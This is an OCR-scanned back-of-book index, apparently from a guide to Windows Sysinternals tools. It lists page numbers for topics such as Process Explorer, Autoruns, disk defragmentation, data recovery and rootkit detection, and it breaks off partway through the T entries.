CastleCops database, 96-97 
applications 
analysis, programming tools for, 
374-378, 387 
background/foreground tuning, 420, 
423-425 
Index 
configuration problems, tracking tools 
for, 382-385 
development, DebugView in, 365 
Du for disk utilization, 272 
hung, troubleshooting, 329 
identifying problematic, 361 
installation, monitoring, 215 
resetting, 176-177 
tracing, DebugView for, 364-368 
applications, network 
identifying problematic, 351-353 
IRP life cycle, 355-356 
TDI commands, 356-359 
tools for finding/correcting issues, 
353-355 
AU (Automatic Update) 
hotfixes, removing with ERD 
Commander, 25-29 
packed images and, 54-55 
Aurora, 62 
authentication packages, 158 
Autologon 
description of, 455-456 
overview of, 452 
setting up, 453 
Automatic Update (AU) 
hotfixes, removing with ERD 
Commander, 25-29 
packed images and, 54-55 
Autoruns 
display feature groupings, 61-66 
exploring autostart locations using, 
57-59 
logs, 68-74 
main window, 59-61 
menu functions, 66-68 
overview of, 107-108, 109 
with Process Explorer, 110 
troubleshooting with, 74-75 
459 

460 
Index 
9 See also Process Explorer 
Autoruns startups 
hxdef rootkit and, 84-95 
investigating, 75 
Look2Me and, 95-101 
malware identification and, 75-78 
SmitFraud Trojan and, 102-104 
stisvc and, 82-84 
svchost and, 78-82 
using file compare for diagnosis, 
104-106 
Vundo Trojan and, 104 
autostart 
items, autoruns logs and, 73-74 
items, controlling with Autoruns, 73 
locations, finding with Autoruns, 57-59 
B 
background applications, 420, 423-425 
bad sectors, 244 
basic disks, 247 
batch files 
Contig and, 229 
defragmentation and, 277 
PsTools and, 154-155,213 
user logons and, 214 
benchmarking tools, 372-373 
Bglnfo desktop background 
command-line operation of, 451-452 
configuration of, 449-451 
custom fields in, 456 
data, customizing display of, 447-449 
description of, 455 
overview of, 447 
wallpaper modification with, 457 
binding, smart 
to Active Directory OU, 232 
troubleshooting, 246 
bitmaps, LDM database, 265 
Black Viper, 83 
Bleeping Computer 
startup database, 75 
svchost and, 78-79 
blended threats, 139 
Blue Screen of Death (BSOD) 
BlueScreen screen saver, 442-444 
crash dump file and, 328 
debugging, 389 
troubleshooting, 308 
understanding, 300 
BlueScreen screensaver 
installation of, 442-443 
overview of, 442 
setting up, 443-444 
boot 
CD, ERD Commander, 2-14 
client for data recovery, 293 
of dead system with ERD 
Commander, 16-17 
floppy, NTRecover, 429 
PageDefrag and, 221-222 
sequence, examining registry during, 
208-211 
Boot Execute Native Images, 64 
bootable CD, Defrag Manager, 233,234 
BootExecute key, 222 
BSOD (Blue Screen of Death) 
BlueScreen screen saver, 442-444 
crash dump file and, 328 
debugging, 389 
troubleshooting, 308 
understanding, 300 
BUFOVRFLOW, 203-204 
bugs, Windows, 379-382 

Index 
461 
C 
cache, disk, 417 
cache, file, 414, 415-416 
CacheSet, 414-418, 436 
CastleCops 
protocol handles database, 77-78 
svchost and, 78-79 
WinLogonNotify database, 96-97 
caveman debugging, 364 
Central Processing Unit (CPU) usage 
graph 
Process Explorer display, 38-39 
resource consumption investigation 
with, 39-45 
Central Processing Unit (CPU) 
utilization, 369-370 
checked build, NT, 422-423 
CHKDSK, 434 
Clear button, CacheSet, 417 
clients 
Defrag Manager settings for, 235-237 
Recovery Manager recovery points, 
289-291 
schedule and, 243-244 
cluster allocations, 218-220 
Cluster Properties window, 250-251 
CName value, 346-347 
color coding, DiskView, 230 
command-line defragmentation, 244-245 
Component entity, LDMDump, 256 
Component record, LDM database, 268 
computer monitoring. See monitoring, 
computer 
computer security. See security, computer 
computers 
PsExec for remote running of, 
194-196 
remote, closing files on with PsFile, 
178 
Config bitmap, LDM database, 265 
connection states 
diagram, 360 
TCP, 333-335 
Contig 
description of, 414, 436 
as environment variable, 231 
file defragmentation with, 223-226 
multiple file defragmentation with, 
226-227 
optimized files with, 228-229 
overview of, 418-420 
control features, Process Explorer, 45-47 
Copy, Autoruns, 68 
Counterspy, 39-45 
CPU usage graph 
Process Explorer display, 38-39 
resource consumption investigation 
with, 39-45 
CPU utilization, 369-370 
Crash Analyzer Wizard 
corrective action, 306-308 
overview of, 300, 325 
prerequisites, 301 
using, 301-306 
crashes, 7 
credentials, active security, 382-384 
Ctrl2cap 
device driver for keyboard filter, 
398-401 
installing/using, 445-446 
keyboard modification, 445 
process of, 446 
uninstalling, 446 
D 
data 
loss from defragmentation, 244 
system, desktop display of, 447-452 

462 
Index 
Data Attribute field, MFT record, 259 
data recovery 
AdRestore, 293-294 
FileRestore, 284-287 
local file restoration, 287 
in NT 4.0, 425-432,437 
NTRecover, 287 
overview of, 295-296 
Recovery Manager, 288-292 
Remote Recover, 282-284 
Data Recovery Agents (DR_As), 127 
Database Records field 
of LDM database, 262 
of LDM database, analysis of, 265-267 
DDK (Microsoft Windows Driver 
Development Kit) 
source code compilation and, 396 
Web site for, 353 
dead system boot, 16-17 
debugging 
application analysis tools, 374-378 
DebugView for tracing, 364-368 
I/O bottleneck identification tools, 
368-374 
tracking application configuration 
problems, 382-385 
verification of DLLs loaded, 384-385 
Windows with LiveKd, 379-382 
DebugView 
application tracing with, 364-368 
overview of, 386 
Defrag Manager, 232-246 
client experience, 243-244 
command-line defragmentation, 
244-245 
installation, 232-234 
overview of, 232 
reporting, 245-246 
running Schedule Console, 234-242 
schedules, working with, 243 
workstations/servers, adding to 
schedule, 242-243 
defragmentation 
with Contig, 223-226, 418-420 
definition of, 220 
description of, 415 
9 See also disk fragmentation 
management 
defragnt, exe, 244-245 
Delete, Autoruns, 67 
deployment, 365 
derivative utilities, 397-405 
desktop. See Bglnfo desktop background 
digital signatures, 149 
directories, 271-272 
directory access rights, 114-115, 
143-145 
Disconnect client mode, Defrag 
Manager, 237 
disk fragmentation management 
cluster allocations, 218-220 
Contig as environment variable, 231 
Contig for, 223-229 
Defrag Manager, 232-246 
DiskView for fragmented file location, 
229-231 
overview of, 277 
pagefile fragmentation, 220-222 
disk group, 261 
disk identifier, LDMDump, 254 
disk information, extended 
DiskExt, 247-250 
DiskView, 250-252 
LDMDump, 254-257 
NTFSInfo, 252-254 
overview of, 277 
disk management 
cluster allocations, 218-220 
Defrag Manager, advanced disk 
fragmentation, 232-246 

Index 
463 
disk utilization, 270-275 
disk volume management, 257-270 
DiskExt, 247-250 
DiskView, 250--252 
LDMDump, 254-257 
means for, 218 
NTFSInfo, 252-254 
optimization of frequently accessed 
files, 223-231 
pagefile fragmentation, 220-222 
Disk Management MMC snap-in 
LDM database access, 266 
for volumes in dynamic disk, 248 
Disk record, LDM database, 267 
disk sectors, 218 
disk utilization 
Du for, 271-272 
file location, viewing, 272-275 
management of, 270 
overview of, 278 
disk volume management 
extended NTFS information, 257-261 
Logical Disk Manager internals, 
261-268 
overview of, 277-278 
volume IDs, 268-270 
DiskExt 
basic disks, 247 
dynamic disks, 248 
for extension determination, 249-250 
DiskGroup record, LDM database, 267 
disks 
basic, 247 
remote disk recovery, 283-284 
disk-space allocation, 252-254 
DiskView 
for extended information, 250-252 
file location with, 272-273 
for fragmented file location, 229-231 
MTFS metadata files view with, 
273-274 
rootkits and, 274-275 
volume examination error, 279 
dispatch entry points, 399 
display feature groupings, Autoruns 
Applnit DLLs, 64 
Boot Execute Native Images, 64 
Drivers, 63 
Everything, 61 
Explorer, 62 
Image Hijacks, 64 
Internet Explorer, 63 
Known DLLs, 65 
Logo n, 61-62 
LSA Providers, 65 
Printer Monitor, 66 
Properties, 65 
Scheduled Tasks, 63 
Services, 63 
Shell Extensions, 63 
ShellExecute Hooks, 63 
WINLOGON Notifications, 65 
Winsock Providers, 65 
DLL. See Dynamic Link Library 
DNS/reverse DNS lookups 
domain name addressing, 344-345 
Hostname for, 360 
Hostname utility, 345 
overview of, 344 
domain name addressing, 344-345 
domain registration, 346 
domains 
The Locksmith Wizard and, 17 
PsList, monitoring computers in with, 
177-178 
DRAs (Data Recovery Agents), 127 
drive failure, 287 
DriverEntry 0 function, 399 
drivers 

464 
Index 
133tspeak keyboard, 404-405 
autoruns display feature groupings, 63 
Ctrl2cap device, modifying, 398-401 
disabling, 307 
errant, identifying, 308, 326 
keyloggers and, 401 
LoadOrder and, 308-311 
TDI, 354 
third-party, 310-311 
updates, 307 
9 See also TDIMon 
Du, 271-272 
dump files, 302 
dynamic disks 
disk group, 261 
partition with LDM, 247 
volume types in, 248 
Dynamic Link Library (DLL) 
Contig search for, 227 
loaded objects, viewing, 370-372 
Process Explorer and, 49 
verification of DLLs loaded, 384-385 
E 
editpad.exe, 53-54 
EFS (Encrypting File System), 126 
EFSDump, 126-128 
ElderGeek, 82, 83 
embedded text, finding, 376-378 
Emergency Recovery Disk (ERD), 427 
Encrypting File System (EFS), 126 
encryption, 127 
End User License Agreement (EULA), 
405-407 
Entry, Autoruns, 67 
entry points, dispatch, 399 
ERD (Emergency Recovery Disk), 427 
ERD Commander 2005 
boot CD, creating, 2-14 
dead system boot, 16-17 
hotfixes, removing, 25-29 
Locksmith for password recovery, 
17-20 
overview of, 2 
recovery utilities, 14-15 
restore points, accessing, 20-24 
errors, source code, 396-397 
Ethereal, 352 
EULA (End User License Agreement), 
405-407 
executables, packed, 52-57 
Explicit Allow/Deny, 119 
Explorer, Autoruns, 62 
explorer.exe, 62 
extended partition, 247 
extensions, 249-250 
F 
file 
access problems, detecting, 311,326 
access rights, 114-115 
caching, 414, 415-418 
crash dump, 328 
File, Autoruns, 67 
file access, benchmarking tools for, 
372-373 
file activity 
viewing, 182 
viewing with Filemon, 213 
File Allocation Table (FAT) file system 
accessing NTFS volume from, 
432-434, 437 
cluster allocation, 218 
file permissions with, 115 
NTFS vs., 257 
File Compare, Autoruns, 104-106 

Index 
465 
file information, extended 
DiskExt, 247-250 
DiskView, 250-252 
LDMDump, 254-257 
NTFSInfo, 252-254 
overview of, 277 
file records, MFT, 257-261 
file restoration 
with FileRestore, 284-287 
overview of, 295 
file system 
activity, monitoring with Filemon, 
182-184 
activity during logon/logoff, 
examining, 215 
optimization, NT 4.0, 414-420 
FileMon 
for benchmarking, 372-373 
configuring, 184-185,312-315 
example of, 315 
examples of, 192-196 
filters, setting up, 190-192 
installing, 311-312 
for I/O bottleneck identification, 387 
for open handle information, 376 
output overview, 186-190 
overview of, 182, 213,326 
for real-time file system activity, 
182-184 
suspicious files, finding with, 322-323 
volume selection, 185-186 
Filename field, MFT record, 259 
FileRestore 
file restoration process, 284-287 
local file recovery with, 296 
overview of, 295 
files 
dump, Crash Analyzer Wizard and, 302 
encrypted, user access list, 126-128, 
146-147 
finding location with DiskView, 
272-275 
finding source program of, 192-194 
moving, 150 
moving/deleting on reboot, 128-130, 
147 
in paths with spaces, closing with 
PsFile, 214 
PsTools for examining, 168-172 
suspicious, finding, 323 
files, local 
determining open with Handle, 
178-182 
investigating suspicious, 135-138, 148 
files, metadata 
NTFSInfo and, 261 
viewing with DiskView, 273-274 
filtering, DebugView, 368 
filters 
133tspeak keyboard, 404-405 
for Filemon, 190-192 
FileMon, 314-315 
keyboard, sample, 398-401 
RegMon, 317-318,328,329 
RegMon, setting up, 205-207 
unknown keyboard, 401 
Find function, Process Explorer, 48 
Firefox, 382-384 
firewalls, 149 
folder locations, 69-72 
Folder permissions inherited by 
files/subfolders, 118 
foreground applications, 420, 423-425 
fragmentation. See disk fragmentation 
management 
fragmented files, 229-231 
free space consolidation, 239 
Frob 
description of, 414 
overview of, 423-425 
Full Control permissions, 115-116 

466 
Index 
G 
GNU General Public License (GPL), 
410 
Google 
Autoruns menu functions, 66, 68 
Autoruns startup troubleshooting 
option, 76 
Process Explorer and, 46, 50 
troubleshooting with, 327 
H 
Hacker Defender, 84-95 
Handle 
description of, 213 
downloading/using, 179-181 
example of, 182 
for open handle information, 376, 385 
for optimization areas, 373-374 
overview of, 178-179 
handle leak, 373-374 
Handle View, Process Explorer, 48 
handles 
closing, 181 
description of, 178-179 
open, information about, 376 
searching for with Handle, 181 
handshake, TCP, 352 
hard disk cluster allocations, 218-220 
hard disk sectors, 218 
Header field, MFT record, 259 
Hide Empty Sections, 68-69 
Hide Signed Microsoft Entries, 66, 112 
HKEY_CLASSES_ROOT, 120 
HKEY_CURRENT_CONFIG, 121 
HKEY_CURRENT_USER, 121 
HKEY_LOCAL_MACHINE, 120, 121 
HKEY_LOCAL_MACHINE\SYSTEM 
\CurrentControlSet\Control, 315 
\HKEY_LOCAL_MACHINE\SYSTE 
M\CurrentControlSet\Control, 
326,328 
HKEY_USERS, 120, 121 
HKLMXSYSTEMXCurrentControlSetXC 
ontrol\ SafeBoot\AlternateShell, 
72-73 
Hostname 
function of, 353 
overview of, 344 
process of, 345 
hotfixes, removing with ERD 
Commander, 25-29 
hxdef, 84-95 
Image Hijacks, 64 
images, packed, 52-57 
impersonation, 161-162 
Include Empty Sections, Autoruns, 66 
Index attribute, 258 
inheritance 
for file encryption, 126 
leveraged, 126 
permissions, configuring, 118-119 
Inherited Allow, 118 
Inside Windows 2000 (Russinovich), 382 
installation 
of Defrag Manager, 232-234 
of keyboard driver, 398-399 
of Recovery Manager, 288 
of Remote Recover, 283,284 
Internet domain registration, 346 
Internet Explorer, Autoruns display 
feature groupings, 63 
Internet Explorer startup page, 209-210 
I/O bottleneck identification, 368-374 
benchmarking, 372-373 
CPU utilization, 369-370 

Index 
467 
loading objects, viewing, 370-372 
optimization, isolating areas for, 
373-374 
overview of, 387 
tools for, 368 
IoSetCompletionRoutine, 400 
IP blocks, 349-350 
IRP life cycle, 355-356 
J 
Jump To, Autoruns menu functions, 68 
K 
Kernel-Mode Development Framework 
(KMDF), 353 
keyboard filters 
keyboard sniffers, 401-405 
sample, 398-401 
keyloggers 
133tspeak filter, 404-405 
creating, 401-404 
KMDF (Kernel-Mode Development 
Framework), 353 
Known DLLs, Autoruns display feature 
groupings, 65 
L 
languages, Sysinternals programming, 394 
layers, single-host application, 351 
LDM. See Logical Disk Manager 
LDM database 
analysis with LDMDump, 263-268 
sections of, 261-263 
LDMDump 
* * * Unknown type: X, 279 
LDM database analysis with, 263-268 
overview of, 254-257 
libraries, 384-385 
licenses 
derivative tools and, 398 
Sysinternals, 405-407 
List Folder Content permissions, 117 
ListDLLs, 384-385 
listview 
of Filemon, 182-184 
of Regmon, 200-203, 207-208 
LiveKd 
debugging Windows with, 379-381 
overview of, 379-382 
loaded objects, 370-372 
LoadOrder 
example of, 310-311 
executing, 309-310 
filtering, 328 
overview of, 308-309, 326 
results, interpreting, 310 
local file restoration, 287 
Locksmith Wizard, The, 18-20 
log, Autoruns 
autostart items, researching, 73-74 
HKLM\SYSTEM\CurrentControlSet\ 
Control\SafeBoot\AlternateShell, 
72-73 
overview of, 68-69 
registry/folder locations, 69-72 
Log bitmap, LDM database, 265 
log files 
applications for reading, 275 
boot process, 208 
Defrag Manager settings for, 240-241 
defragmentation reports and, 245-246 
DiskView, 273 
keyboard sniffer, 401-403 
Regmon, 215 
TokenMon/FileMon/RegMon 
listview, 184 

468 
Index 
Logical Disk Manager (LDM) 
DiskExt, 247-250 
DiskView, 250--252 
dynamic disk partition with, 247, 248 
LDM database, 261-268 
LDMDump, 254-257 
NTFSInfo, 252-254 
login screen, bypassing, 453, 457 
Logon, Autoruns display feature 
groupings, 61-62 
logon types, 158-159 
LogonSessions 
logged-on users, finding information 
about, 155-156 
output, 157-161 
for viewing current Windows sessions, 
156-157 
Look2Me, 96-101 
lookups, DNS/reverse DNS 
domain name addressing, 344-345 
Hostname for, 360 
Hostname utility, 345 
overview of, 344 
LSA Providers, Autoruns display feature 
groupings, 65-66 
lsass.exe, 165 
M 
mail slots, 313 
malware 
keyloggers, 401 
nontraditional Autoruns locatable, 
102-104 
packed images, 52-57 
processes, indicators of, 112 
starting locations, 105-106 
symptoms recognized by Process 
Explorer, 52 
9 See also Autoruns; Process Explorer 
Master Boot Record (MBR), 247 
Master File Table (MFT) 
file records, 257-260 
NTFSInfo for information, 260--261 
Zone, finding with DiskView, 251-252 
Zone, output information, 261 
Zone, volume space, 257 
MBR (Master Boot Record), 247 
MDAC (Microsoft Data Access 
Components) 
Bglnfo and, 450 
for Recovery Manager installation, 288 
memory 
file system optimization and, 414 
leaks, resetting applications for, 
176-177 
PsList and, 172-176 
resource consumption and, 39-41 
system debuggers and, 380 
menu functions, Autoruns, 66-68 
metadata files 
NTFSInfo and, 261 
viewing with DiskView, 273-274 
MFT. See Master File Table 
Microsoft Data Access Components 
(MDAC) 
Bglnfo and, 450 
for Recovery Manager installation, 288 
Microsoft Debugging Tools, 300 
Microsoft Dependency Walker, 389 
Microsoft Networks (MSN) search, 50 
Microsoft Visual Studio 6.0 IDE, 394 
Microsoft Windows 2000 
Ctrl2cap on, 446 
LoadOrder and, 310 
NTFS volume, diagnosis from NT 4.0, 
434-435,437-438 
Microsoft Windows Driver Development 
Kit (DDK) 

Index 
469 
source code compilation and, 396 
Web site for, 353 
Microsoft Windows NT 4.0 
data recovery, 425-432 
FAT to NTFS volume access, 432-434 
optimizing, 414-425,436 
tools for, 414 
Windows 2000 NTFS volume, 
diagnosing from, 434-435 
Microsoft Windows Platform Software 
Development Kit (SDK) 
for resolving missing reference errors, 
396-397 
for Sysinternals code compilation, 410 
Web site for, 396 
mirrored volume, 248 
"missing reference" errors, 396-397 
Modify permissions, 116 
monitoring, computer 
file activity, viewing, 182 
Filemon, configuring, 184-186 
Filemon, examples of, 192-196 
FileMon, for monitoring file system 
activity, 182-184 
Filemon output, 186-192 
local files, determining open, 178-182 
LogonSessions for user information, 
155-161 
logons/sessions overview, 152 
open resources/processes, finding, 
168-178 
overview of, 152 
PsLoggedOn for seeing users, 152-155 
PsTools for examining running 
processes/files, 168-178 
Registry, examining during NT-based 
boot sequence, 208 
registry activity, viewing with 
RegMon, 196-197 
Regmon, configuring, 201 
Regmon, examples of use, 209-211 
Regmon, for registry real-time activity, 
199-200 
Regmon filters, setting up, 205-208 
Regmon output, overview of, 201-205 
security tokens, 161-168 
Windows Registry, overview of, 
197-199 
MoveFile, 128, 130 
MSConfig, 57, 58 
MSN (Microsoft Networks) search, 50 
N 
-n switch, 228 
named pipes, 313 
.NET application, 374 
Netstat 
advantages of, 340 
description of, 360 
parameters of, 336-338 
TCPView vs., 332-333 
TDIMon vs., 389 
network 
applications, identifying problematic, 
351-359 
data recovery across, 282-284, 295 
resources, monitoring with FileMon, 
313 
9 See also troubleshooting, network 
network connections 
monitoring active, 360 
Tcpvcon, monitoring with, 335-343 
TCPView, monitoring with, 332-335 
TCPView Pro, monitoring with, 
343-344 
NOMORs 204 
notifications, Defrag Manager settings 
for, 241 
NotMyFault utility, 304 

470 
Index 
NT File System (NTFS) 
access from FAT volume, 432-434, 437 
ACLs, configuring, 115-117 
cluster allocation, 218 
extended information for, 257-261 
FAT vs., 257 
file/directory access rights on, 114-115 
metadata files, viewing with DiskView, 
273-274 
moving/copying files on, 149 
permissions inheritance, configuring, 
118-119 
NTFSCHK, 434-435,437-438 
NTFSDOS, 432-434, 437 
NTFSHLP.VXD, 433, 437 
NTFSInfo 
for MFT information, 260-261 
output, 252-254 
overview of, 251-252 
ntpmon.exe, 421 
NTRecover 
components for, 296 
damaged volume, repair of, 432 
data recovery with, 287 
description of, 437 
lost/damaged data, recovery of, 
427-431 
overview of, 425-427 
O 
objects, 178 
open handles/sockets, 376 
open systems interconnection (OSI) 
network model, 351,352 
operating systems (OSs) 
Microsoft, file/folder security of, 
144-145 
rootkits and, 144-145 
optimization, file, 223-231 
optimization, tools for isolating areas of, 
373-374 
Options, Autoruns menu functions, 66 
Organizational Unit (OU),AD 
binding to schedule, 242-243, 246 
smart binding to, 232 
OSI (open systems interconnection) 
network model, 351,352 
OSs (operating systems) 
Microsoft, file/folder security of, 
144-145 
rootkits and, 144-145 
OU (Organizational Unit), AD 
binding to schedule, 242-243, 246 
smart binding to, 232 
output. See individual utility names 
output, LogonSessions.exe, 157-161 
output file, keyboard filter, 401--403 
OutputDebugString0 function, 366 
P 
packed images, 52-57 
PageDeffag 
for pagefile fragmentation, 221 
questions about, 278-279 
removal, manual, 222 
pagefile fragmentation, 220-222 
partition, 247,248 
partition layout, 254-255 
partitioning 
LDM database, 261-268 
LDMDump for, 254-257 
passwords 
ERD Commander CD access, 7 
recovery with Locksmith, 17-20 
paths 
in Regmon, 316 

Index 
471 
Sysinternals code compilation and, 410 
PendingFileRenameOperations key, 130 
PendMoves, 128-129 
Performance Graph, Process Explorer, 39 
permissions 
inheritance, configuring, 118-119 
NTFS, 114-117 
share, 147 
share, viewing, 131-134 
PID (Process ID) 
handles and, 178-181 
PsKill and, 322 
PsList and, 173 
platters, hard disk, 218 
PMon 
description of, 414, 436-437 
overview of, 420-423 
ports, coding and, 394-396 
precision repair 
with Recovery Manager, 292 
when to use, 297 
Printer Monitor, Autoruns display feature 
groupings, 66 
priority 
Defrag Manager setting, 238-239 
of schedule, 243-244 
Private Header field, LDM database, 
262-264 
process, optimization, NT 4.0, 420-425 
Process Color Key, Process Explorer, 
47-48 
Process Context menu, Process Explorer, 
49-50 
Process Explorer 
with Autoruns, 110 
Autoruns, combining with for 
troubleshooting, 74-75 
Autoruns menu functions, 68 
control features of, 45-47 
for CPU utilization, 369-370 
default display, 36-39, 47-51 
description of, 108 
finding embedded text with, 376-377 
for I/O botdeneck identification, 387 
loaded objects with, 370-372 
malware symptoms recognized by, 
52-57 
for open socket information, 376 
for optimization areas, 373-374 
overview of, 36, 107-108 
process resource consumption, 39-45 
for Rootkit detection, 84-95 
security features of, 111 
shortcut toolbar, 51-52 
Task Manager vs., 111 
TCPView and, 333 
tracking application configuration 
problems with, 382, 388 
updates, 111 
verification of DLLs loaded, 384-385 
viewing/starting/stopping processes 
with, 45 
. See also Autoruns 
Process Explorer display 
CPU usage graph, 38-39 
DLLs, 49 
Find function, 48 
Google/MSN Search, 50 
Handle View, 48 
Help menu, 49 
lower pane, 37-38, 48 
overview of, 36 
Process Color Key, 47-48 
Process Context menu, 49-50 
Process function, 48 
Process Properties dialog, 50-51 
Properties, 50 
toolbar buttons, 38 
upper pane, 37, 47 
Users menu, 49 

472 
Index 
Process ID (PID) 
handles and, 178-181 
PsKill and, 322 
PsList and, 173 
Process Properties dialog, 50-51 
processes 
access tokens and, 158-159 
PsList, monitoring with, 172-176 
PsTools for finding running, 168-169 
running, analysis of, 319-322, 327 
stopping with PsKill, 321 
viewing/starting/stopping with Process 
Explorer, 45, 109 
procsys.sys, 421 
programming tools 
for application analysis, 374-378 
DebugView for trace feature, 364-368 
for I/O botdeneck identification, 
368-374 
LiveKd for debugging Windows, 
379-382 
for tracking application configuration 
problems, 382-385 
Properties, Autoruns display feature 
groupings, 65 
PsExec, 194-196 
PsKill 
description of, 177 
overview of, 327 
for stopping processes, 321-322 
PsList 
for CPU information on processes, 
319-321 
overview of, 327 
PsLoggedOn, 152-155,214 
PsTools 
combining with FileMon/RegMon, 
322,324 
computer connections with, 215 
installation of, 214 
listing process information with, 
319-321 
overview of, 168-169, 327 
PsFile.exe, open files remote 
monitoring with, 169-172 
PsFile/PsList examples, 176-178 
PsList.exe, monitoring processes with, 
172-176 
running process analysis with, 319 
stopping processes with, 321-322 
public domain information 
Internet domain registration, 346 
overview of, 346 
Whois, running/interpreting results, 
346-350 
Whois and, 360-361 
Q 
quantum, 423,424-425 
Query Process Explorer, 76 
query processing, domain name, 345 
quiet mode, Contig, 227 
R 
RAID-5 volume, 248 
Read & Execute permissions, 116-117 
Read permissions, 117 
reboot 
with ERD Commander, 16 
moving/deleting files on, 128-130 
Recovery Manager, 288-292 
database backend for, 297 
overview of, 296 
precision repair with, 292 
setup, management, 288-292 
recovery points, scheduling, 288-291 

Index 
473 
recovery sets, 288,290 
recovery utilities, ERD Commander, 
14-15 
recursive server-to-server queries, 345 
Recycle Bin, 282 
registration, Internet domain, 346 
registry 
access problems, detecting, 311, 316, 
326 
access rights, 120-122 
activity, viewing with Regmon, 
195-197,214 
key for driver/service start order, 328 
real-time monitoring with Regmon, 
199-200 
Regmon, example of, 318 
Regmon, using, 316-318 
troubleshooting with RegMon, 326 
registry keys 
benchmarking tools for, 373 
program settings, monitoring, 211 
registry locations, Autoruns logs, 69-72 
RegMon 
for benchmarking, 372, 373 
combining with FileMon for 
troubleshooting, 322,323-324 
configuring, 201 
examples of, 209-211 
filters, setting up, 205-208 
for I/O bottleneck identification, 387 
logs, 2t5 
during NT-based boot sequence, 208 
for open handle information, 376 
output overview, 201-205 
overview of, 214, 326 
real-time activity, monitoring with, 
199-200 
registry activity, viewing with, 196-197 
Remote Manager, 297 
Remote Recover 
functions of, 282 
overview of, 295 
remote data recovery with, 282-283 
remote disk recovery with, 283-284 
UDP over Ethernet for, 6 
Remote Recover client, ERD 
Commander, 5, 6, 16 
remote registry access, 319 
Remote Registry service, 153 
request packets, 355-356 
requests 
FileMon, 186 
impersonation, 214 
RegMon, 202-203 
resource consumption, 39-45 
resources 
file/directory access rights, 114-119 
monitoring with FileMon, 328 
open, finding, 168-178,213 
registry access rights, 120-122 
security settings, viewing, 146 
shared, viewing, 131-134, 147 
restore points, 20-24 
reverse DNS lookups. See DNS/reverse 
DNS lookups 
root keys, Windows registry, 194-196 
Rootkit Revealer 
description of, 111 
overview of, 138-140 
rootkits, removing, 143-145 
rootkits, scanning for, 140-143 
rootkits 
AntiHookExe for, 274-275 
detecting with Process Explorer, 84-95 
operating system reinstallation and, 
144-145 
searching for installed, 138-145, 148 
rundl132.exe, 99-100 
running applications, 374-376 
Russinovich, Mark 
Inside Windows 2000, 382 
Process Explorer and, 36, 130 
on WINLOGON process/viruses, 130 

474 
Index 
S 
Sam Spade utility, 349 
scan codes, nonprintable, 404 
schedule 
client experience, 243-244 
Defrag Manager Schedule Console, 
234-242 
of Recovery Manager, 288-290 
working with, 243 
workstations/servers, adding to, 
242-243 
Scheduled Tasks, Autoruns display feature 
groupings, 63 
Schneider, Matt, 350 
screen saver, BSOD, 453 
scripts, 154 
SDK (Microsoft Windows Platform 
Software Development Kit) 
for resolving missing reference errors, 
396-397 
for Sysinternals code compilation, 410 
Web site for, 396 
Search Engine, Autoruns menu function, 
66, 68 
sectors, hard disk, 218 
security, computer 
checking, 114 
encrypted file user access list, 126-128 
files, moving/deleting on reboot, 
128-130 
local files, investigating suspicious, 
135-138 
resources security settings, 114-126 
rootkits, searching for installed, 
138-145 
shared resource/access permissions, 
viewing, 131-134 
Security Descriptor field, MFT record, 
259 
security tokens, 161-168 
servers 
adding to schedule, 242-243 
virtual, recovering with ERD 
Commander, 9 
Service Packs, NT 4.0, 423 
services 
deleting, 93-94 
nonessential, handling, 84 
viewing/starting/stopping with Process 
Explorer, 45 
Services, Autoruns display feature 
groupings, 63 
shared resources, 131-134, 147 
ShareEnum, 131-134 
Shell Extensions, Autoruns display feature 
groupings, 63 
SheUExecute Hooks, Autoruns display 
feature groupings, 63 
SheUHWDetection, 78-82 
Sigcheck, 135-138 
signatures 
digital, 149 
verifying with Sigcheck, 135-138 
simple volume, 248 
smart binding 
to Active Directory OU, 232 
troubleshooting, 246 
SmartBind feature, 242-243 
SmartPhase technology, 232 
SmitFraud Trojan, 102-104 
sniffer, keyboard 
133tspeak filter, 404-405 
overview of, 401 
socket connections, 332 
sockets, 376 
software licensing, 405-407 
source code 
compiling, 396-397 
languages used, 394 
license uses, 405-407, 409 

Index 
475 
overview of, 392, 408 
porting considerations, 394-396 
sample derivative utilities, 397-405, 
409 
Sysinternals, compiling, 408-409 
tools available for, 410 
tools with, 392-393 
spanned volume, 248 
stack information, 375 
Standard Information field, MFT record, 
259 
startup file optimization, 229 
stisvc, 82-84 
Strings utility 
for application analysis, 387 
finding embedded text with, 376, 
377-378 
striped volume, 248 
SunProtectionServer.exe, 39-45 
svchost 
description of, 61 
ShellHWDetection, 78-82 
stisvc, 82-83 
Sysinternals 
AccessEnum, 114-126 
Autologon, 452-453 
Autoruns, 57 
Bglnfo, 447-452 
BlueScreen, 442-444 
Ctrl2cap, 445-446 
DiskExt, 249-250 
Du, 271-272 
EFSDump, 126-128 
Filemon, 182-192 
Frob, 423-425 
Handle, 178-182 
LogonSessions, 152-155 
MoveFile, 128, 130 
NotMyFault utility, 304 
NTFSDOS, 432-434 
NTRecover, 425-427 
Pmon, 421-423 
PsExec, 194-196 
PsKill, 177 
PsLoggedOn, 152-155 
PsTools, 168-178, 319 
Rootkit Revealer, 111,140-143 
ShareEnum, 131-134 
Sigcheck, 135-138 
software licensing, 405-407 
system modifications with, 442 
Volume ID tool, 269-270 
Whois, 346-350 
9 See also Autoruns; LDMDump; 
Process Explorer; programming 
tools 
Sysinternals source code 
compiling, 396-397,408-409 
languages used, 394 
license uses, 405-407,408-409 
overview of, 392, 408 
porting considerations, 394-396 
sample derivative utilities, 397-405, 
409 
tools with, 392-393 
system 
dead, ERD Commander boot of, 
16-17 
information, desktop display of, 
447-452 
modifications with Sysinternals, 442 
system crash 
LiveKd for debugging Windows, 381 
with no dump file, 389 
simulating, 456 
system dump file, 381 
system performance, 220 
system rollback, 292, 297 

476 
Index 
T 
Table of Contents field, LDM database, 
262, 265 
tags, 311 
Task Manager 
Process Explorer and, 36 
Process Explorer vs., 111 
TCP handshake, 352 
Tcpvcon, 335-343, 360 
TCPView, 332-335,360 
TCPView Pro 
description of, 360, 361 
overview of, 343-344 
TCPView vs., 362 
TCPVStat, 336 
TDI (Transport Driver Interface) 
commands, 356-359 
TDIMon 
netstat vs., 389 
network troubleshooting with, 352, 
361 
for open socket information, 376 
overview of, 354-355 
TCPView Pro and, 343 
text, embedded, 376-378 
threads 
application analysis, 374-375 
CPU utilization, 369-370 
monitoring with PMon, 421-422 
timestamp, FileMon, 373 
TLD (Top Level Domain), 345 
token access, benchmarking tools for, 373 
TokenMon 
for benchmarking, 373 
configuring/running, 162-165 
description of, 161 
for I/O botdeneck identification, 387 
output, 165-167 
practical uses of, 168 
tokens, overview of, 161-162 
tracking application configuration 
problems, 383, 388 
tokens 
